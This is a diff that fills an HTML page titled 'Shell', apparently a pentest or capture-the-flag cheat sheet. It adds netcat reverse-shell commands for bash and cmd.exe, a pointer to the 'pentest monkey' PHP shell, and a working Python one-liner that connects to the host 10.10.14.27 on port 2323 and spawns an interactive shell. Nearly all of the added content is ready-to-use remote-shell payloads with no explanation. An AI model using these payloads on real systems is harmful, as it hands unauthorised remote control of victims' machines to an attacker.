@@ -3,4 +3,17 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Shell</title>
-</head><body></body></html>
+</head><body><b>netcat</b><br/>
+<br/>
+nc &lt;ip&gt; &lt;port&gt; -e /bin/bash<br/>
+nc &lt;ip&gt; &lt;port&gt; -e cmd.exe<br/>
+<br/>
+<br/>
+<b>php</b><br/>
+pentest monkey<br/>
+<br/>
+<br/>
+<b>python.py</b><br/>
+<br/>
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",2323));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")<br/>
+</body></html>
